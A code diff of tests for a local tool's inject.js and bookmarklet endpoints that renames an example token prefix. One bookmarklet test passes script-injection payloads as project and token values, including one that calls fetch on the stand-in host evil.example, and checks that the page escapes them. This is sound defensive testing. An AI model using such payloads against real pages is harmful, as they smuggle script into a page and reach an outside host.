@@ -44,8 +44,8 @@ describe("GET /inject.js", () => {
 describe("the addresses it is loaded from", () => {
     it("scriptUrl adds only what was asked for", () => {
         expect(scriptUrl("http://localhost:4747")).toBe("http://localhost:4747/inject.js");
-        expect(scriptUrl("http://localhost:4747/", { project: "shop", token: "pft_abc" })).toBe(
-            "http://localhost:4747/inject.js?project=shop&token=pft_abc"
+        expect(scriptUrl("http://localhost:4747/", { project: "shop", token: "notato_abc" })).toBe(
+            "http://localhost:4747/inject.js?project=shop&token=notato_abc"
         );
     });
 
@@ -101,7 +101,7 @@ describe("GET /bookmarklet", () => {
         // %27 in the page's query string arrives as a quote, and a javascript: address is decoded before it runs.
         const html = bookmarkletPage("http://localhost:4747", {
             project: "x'+alert(document.domain)+'",
-            token: "pft_a'+fetch('//evil.example')+'",
+            token: "notato_a'+fetch('//evil.example')+'",
         });
         expect(html).not.toContain("alert(document.domain)");
         expect(html).not.toContain("evil.example");
